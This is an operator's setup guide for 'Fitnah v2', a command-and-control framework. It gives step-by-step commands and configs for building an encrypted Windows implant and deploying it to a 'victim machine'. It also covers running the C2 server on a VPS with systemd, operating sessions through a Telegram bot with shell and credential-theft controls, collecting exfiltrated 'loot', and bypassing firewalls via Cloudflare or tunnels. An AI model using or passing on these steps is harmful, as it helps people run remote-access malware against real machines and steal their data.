# Fitnah v2 — Lab & VPS Setup Guide

This guide covers initial deployment of Fitnah v2 C2 framework in both local lab and cloud environments.

## Prerequisites

- **Python 3.10+** (3.11+ recommended)
- **pip** (latest)
- **git**
- **Windows target** (victim machine running Windows 10/11/Server 2019+)
- **Telegram Bot Token** (created via BotFather)
- **Internet connectivity** between lab/VPS and target
- Optional: **Discord Bot Token** (fallback transport)

### Installation Check

```bash
python --version  # must be 3.10+
pip --version
git --version
```

## Local Lab Setup

### Single-Machine Lab (Python VM + Windows VM)

**Architecture**: C2 server runs on Linux/macOS lab machine; implant beacons over HTTPS/HTTP or Telegram to the C2.

#### Step 1: Clone and Install

```bash
git clone https://github.com/yourusername/fitnah.git
cd fitnah
pip install -e .
# or: pip install -r requirements.txt
```

#### Step 2: Create Telegram Bot

1. Open Telegram and message @BotFather
2. Type `/newbot`
3. BotFather asks for bot name → enter: `fitnah_lab`
4. BotFather asks for username → enter: `fitnah_lab_bot` (must be unique)
5. Copy the **API Token** (e.g., `123456789:ABCDEfGHijKLmNoPqRsT_uVwXyZ`)

#### Step 3: Get Your Telegram ID

1. Message @userinfobot in Telegram
2. It replies with your numeric user ID (e.g., `1234567890`)
3. **Keep this safe** — it's your operator_chat_id

#### Step 4: Configure Fitnah

```bash
mkdir -p config
cat > config/framework.yaml << 'EOF'
telegram:
  token: "YOUR_BOT_TOKEN_HERE"        # from BotFather
  operator_chat_id: YOUR_NUMERIC_ID   # from @userinfobot

http:
  enabled: true
  host: "127.0.0.1"
  port: 8888
  agent_key: "fitnah-secret-key-change-me"

builder:
  output_dir: "build"
  compiler: "gcc"  # or "clang"

checkin_ttl: 300  # seconds — mark session stale if no checkin
task_timeout: 30  # seconds — max time for a plugin to run
failover_threshold: 3  # consecutive failures before Discord failover
EOF
```

#### Step 5: Generate Windows Implant

```bash
python -m fitnah builder --format exe --arch x64 --encrypt aes-256-gcm
# Output: build/agent_<timestamp>.exe
```

#### Step 6: Deploy to Windows VM

1. Transfer `build/agent_*.exe` to Windows VM (via USB, SMB, etc.)
2. Run on Windows target:
   ```cmd
   agent_12345678.exe --c2 http://lab-machine-ip:8888 --key fitnah-secret-key-change-me
   ```
3. Implant beacons to C2 every 15 seconds (configurable)

#### Step 7: Start C2 Server

```bash
python fitnah.py
# or: python main.py (if your entry point is main.py)
```

You'll see:
```
[kernel] started — N plugin(s) loaded  transport=telegram
[*] HTTP listener on 0.0.0.0:8888
[telegram] connected
```

#### Step 8: Operator Dashboard

1. Open Telegram
2. Message your bot or search for it by username
3. Type `/start` or send any message
4. Inline keyboard appears with: Sessions | Loot | Builder | Status
5. Click **Sessions** → shows all active agents
6. Click an agent hostname → full control panel (Shell, Recon, Creds, etc.)

### Local Lab Troubleshooting

| Issue | Solution |
|-------|----------|
| "ModuleNotFoundError: No module named 'fitnah'" | Run `pip install -e .` in the root directory |
| Telegram bot doesn't respond | Check `telegram.token` in `config/framework.yaml` — must not be placeholder |
| Implant exits immediately | Check C2 URL and agent key — must match server settings |
| Slow beacon interval | Adjust `checkin_ttl` — shorter = more network traffic |
| Session marked stale | Implant must beacon at least once every 5 minutes (default `checkin_ttl: 300`) |

---

## VPS Setup (Ubuntu/Debian)

### Remote C2 Server on Digital Ocean / AWS / Linode / Hetzner

#### Step 1: Provision VPS

- **OS**: Ubuntu 22.04 LTS or Debian 12
- **RAM**: 2 GB minimum (4 GB recommended)
- **Disk**: 20 GB (50 GB if collecting large loot)
- **Ports to open**: 8888 (HTTP listener), 443 (optional HTTPS)

SSH into the VPS:

```bash
ssh root@your-vps-ip
apt update && apt upgrade -y
```

#### Step 2: Install Dependencies

```bash
apt install -y python3.11 python3.11-venv python3-pip \
    git curl wget gcc mingw-w64 build-essential
```

#### Step 3: Clone Fitnah

```bash
cd /opt
git clone https://github.com/yourusername/fitnah.git
cd fitnah
python3.11 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -e .
```

#### Step 4: Configure Firewall

```bash
# UFW (default on Ubuntu)
ufw allow 22/tcp   # SSH
ufw allow 8888/tcp # HTTP listener
ufw enable

# Or AWS Security Groups / DigitalOcean Firewall equivalent
```

#### Step 5: Secure Configuration

Create `/opt/fitnah/config/framework.yaml`:

```yaml
telegram:
  token: "YOUR_BOT_TOKEN_HERE"
  operator_chat_id: YOUR_NUMERIC_ID

http:
  enabled: true
  host: "0.0.0.0"              # Listen on all interfaces
  port: 8888
  agent_key: "CHANGE-THIS-KEY"  # Use a strong, random key

builder:
  output_dir: "/opt/fitnah/build"
  compiler: "gcc"

checkin_ttl: 300
task_timeout: 60
failover_threshold: 5

operator_tag: "vps-operator"
allowed_ids: []  # leave empty to allow all OR list specific Telegram IDs
```

**Protect sensitive files:**

```bash
chmod 600 config/framework.yaml
chmod 700 config/
```

#### Step 6: Persistent Process with systemd

Create `/etc/systemd/system/fitnah.service`:

```ini
[Unit]
Description=Fitnah v2 C2 Server
After=network.target

[Service]
Type=simple
User=fitnah
WorkingDirectory=/opt/fitnah
ExecStart=/opt/fitnah/venv/bin/python /opt/fitnah/fitnah.py
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

Create fitnah user:

```bash
useradd -r -s /bin/bash fitnah
chown -R fitnah:fitnah /opt/fitnah
```

Enable and start:

```bash
systemctl daemon-reload
systemctl enable fitnah
systemctl start fitnah
systemctl status fitnah
```

#### Step 7: Using screen (Alternative to systemd)

If not using systemd:

```bash
screen -S fitnah
cd /opt/fitnah
source venv/bin/activate
python fitnah.py
# Detach: Ctrl+A, then D
# Reattach: screen -r fitnah
```

#### Step 8: Monitor Logs

```bash
# Systemd
journalctl -u fitnah -f

# Or direct logs if using screen
tail -f /opt/fitnah/logs/fitnah.log
```

### VPS Reverse Tunnel (for NAT/Firewall Bypass)

If targets can't reach VPS directly (behind NAT/firewall):

#### Option A: HTTP Reverse Proxy via Cloudflare

1. Register domain (e.g., `c2.example.com`)
2. Add DNS record pointing to VPS IP
3. Configure Cloudflare (free tier):
   - Point nameservers to Cloudflare
   - Enable HTTP proxy (orange cloud icon)
4. Update implant C2 URL: `http://c2.example.com`

#### Option B: SSH Tunnel (Lab Testing)

From your lab machine:

```bash
ssh -R 8888:localhost:8888 root@vps-ip
# Now VPS port 8888 forwards to your lab machine's 8888
```

#### Option C: Ngrok/Expose (Temporary Testing)

```bash
# On VPS
ngrok http 8888
# Get public URL like: https://abcd-1234-efgh-5678.ngrok.io
```

### VPS Troubleshooting

| Issue | Solution |
|-------|----------|
| "Permission denied: /opt/fitnah" | Run `chown -R fitnah:fitnah /opt/fitnah` |
| Service fails to start | Check `/var/log/syslog` or `journalctl -u fitnah -e` |
| Telegram not responding | Verify IP isn't blacklisted; test with `curl -I https://api.telegram.org` |
| Port 8888 in use | `ss -tlnp \| grep 8888` — kill process or use different port |
| Disk full | Check `/opt/fitnah/build` (artifacts) and `data/loot` (exfiltrated files) |

---

## Directory Structure After Installation

```
fitnah/
├── config/
│   ├── framework.yaml          # main config (DO NOT COMMIT)
│   └── framework.yaml.example  # template
├── build/                       # compiled payloads
│   ├── agent_x64.exe
│   ├── agent_x86.exe
│   ├── agent.ps1
│   ├── agent.hta
│   └── agent.shellcode
├── data/
│   ├── loot/                    # exfiltrated files
│   │   └── loot.db
│   ├── staging/                 # temporarily uploaded files
│   ├── sessions.db              # session state
│   └── audit.log                # operational log
├── logs/
│   └── fitnah.log               # server logs
├── fitnah/
│   ├── implant/                 # agent code (beacon logic, command handlers)
│   ├── c2/                      # server code (router, plugins, transports)
│   ├── plugins/                 # plugin library
│   ├── builder/                 # payload compiler & encryptor
│   ├── sdk/                      # plugin SDK (BasePlugin, PluginContext)
│   ├── loot/                    # loot store (DB interface)
│   ├── orchestration/           # kernel, session mgmt, audit
│   └── delivery/                # obfuscation, staging
├── fitnah.py                     # console entry point
├── main.py                       # server entry point (or flask app)
├── requirements.txt
├── setup.py
├── README.md
└── README_*.md                   # this guide + others
```

---

## First-Time Checklist

- [ ] Python 3.10+ installed
- [ ] Telegram bot created (token obtained from @BotFather)
- [ ] Your Telegram numeric ID obtained (@userinfobot)
- [ ] `config/framework.yaml` created with real token & operator_chat_id
- [ ] C2 server starts without errors: `python fitnah.py`
- [ ] Implant built: `python -m fitnah builder`
- [ ] Implant deployed to Windows target
- [ ] Implant beacons successfully (appears in Telegram UI as new session)
- [ ] Plugin test: click /recon → sysinfo on agent
- [ ] Audit log contains checkin entry: `data/audit.log`

---

## Next Steps

- **Operator Guide**: See `README_USAGE.md` for CLI and inline keyboard usage
- **Plugin Development**: See `README_PLUGINS.md` to write custom plugins
- **Telegram Config**: See `README_TELEGRAM.md` for multi-operator setup
- **Discord Fallback**: See `README_DISCORD.md` to enable secondary transport
- **Advanced**: See `README_CTF_ADVANCED.md` and `README_HOSTILE.md` for evasion/persistence
